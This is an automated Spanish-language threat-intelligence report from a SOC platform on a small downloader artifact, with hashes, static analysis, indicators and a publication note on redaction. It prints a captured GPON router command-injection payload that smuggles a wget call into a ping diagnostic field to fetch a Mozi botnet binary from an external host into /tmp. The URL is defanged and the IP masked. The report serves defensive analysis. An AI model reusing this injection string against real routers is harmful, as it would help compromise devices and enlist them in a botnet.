# 🧬 Payload Analysis

`23f39cc0b4a6bdb09a17101d6bc584c9a021722291539c24305a3e49577b6862`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:25:57+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `23f39cc0b4a6bdb09a17101d6bc584c9a021722291539c24305a3e49577b6862`
- **MD5:** `8848ed46d35b26b121e396ee6258d962`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.16 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 202.47.56.XXX | static_analysis |
| url | hxxp://202.47.56.XXX:59235/Mozi.m+-O+- | strings |
| hash | 23f39cc0b4a6bdb09a17101d6bc584c9a021722291539c24305a3e49577b6862 | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80; | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
